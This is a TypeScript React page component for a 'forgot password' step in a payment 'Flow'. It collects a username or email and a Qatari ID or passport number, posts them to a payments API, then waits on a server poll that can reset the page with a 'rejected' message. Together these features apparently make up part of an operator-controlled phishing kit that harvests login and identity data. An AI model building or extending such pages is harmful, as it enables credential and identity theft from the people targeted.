import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import { useLang } from "../../context/LanguageContext";
import { FlowHeader } from "./FlowHeader";
import { FlowLoading } from "./FlowLoading";
import styles from "./FlowForgotPasswordPage.module.scss";

export function FlowForgotPasswordPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { t, dir } = useLang();
  const ft = t.flow;
  const ff = ft.forgotPassword;

  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [email, setEmail] = useState("");
  const [qid, setQid] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  const [emailRequiredError, setEmailRequiredError] = useState(false);
  const [emailPhoneError, setEmailPhoneError] = useState(false);

  useFlowPoll({
    reference,
    currentPage: "forgot-password",
    enabled: !!reference,
    onReset: () => {
      setSubmitted((prev) => {
        if (prev) setError(ff.rejected);
        return false;
      });
    },
  });

  const validateEmail = (val: string) => {
    if (!val.trim()) { setEmailRequiredError(true); setEmailPhoneError(false); return false; }
    setEmailRequiredError(false);
    const isPhone = /^[\d\s\+\-\(\)]{4,}$/.test(val) && /\d{4,}/.test(val);
    setEmailPhoneError(isPhone);
    return !isPhone;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const isEmailValid = validateEmail(email);
    if (!isEmailValid || !qid.trim()) {
      if (!qid.trim()) setError(ff.fillAll);
      return;
    }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "reset_password_submitted", {
        email_or_username: email.trim(),
        qatari_id_or_passport: qid.trim(),
      });
      setSubmitted(true);
    } catch {
      setError(ft.networkError);
    } finally {
      setBusy(false);
    }
  };

  if (!reference) { navigate("/", { replace: true }); return null; }

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100vh" }}>
      <FlowHeader />
      <div className={styles.container} dir={dir}>
        <div className={styles.card}>
          <div className={styles.header}>
            <p className={styles.brandText}>{ft.brand}</p>
            <h1 className={styles.title}>{ff.title}</h1>
            <p className={styles.subtitle}>{ff.subtitle}</p>
          </div>
          <p className={styles.desc}>{ff.desc}</p>

          {error && <div className={styles.errorBox}>{error}</div>}

          <form onSubmit={handleSubmit} className={styles.form}>
            <div>
              <input
                type="text"
                name="email_or_username"
                autoComplete="username"
                placeholder={ff.usernamePlaceholder}
                value={email}
                onChange={(e) => { setEmail(e.target.value); validateEmail(e.target.value); }}
                onBlur={() => validateEmail(email)}
                className={`${styles.input} ${emailRequiredError || emailPhoneError ? styles.inputError : ""}`}
              />
              {emailRequiredError && <p className={styles.fieldError}>{ft.required}</p>}
              {emailPhoneError && <p className={styles.fieldError}>{ft.noPhoneAllowed}</p>}
            </div>

            <input
              type="text"
              name="qatari_id_or_passport"
              autoComplete="off"
              placeholder={ff.qidPlaceholder}
              value={qid}
              onChange={(e) => setQid(e.target.value)}
              className={styles.input}
            />

            <button type="submit" disabled={busy || emailPhoneError} className={styles.submitBtn}>
              {ff.submit}
            </button>
          </form>
        </div>
        {submitted && <FlowLoading />}
      </div>
    </div>
  );
}
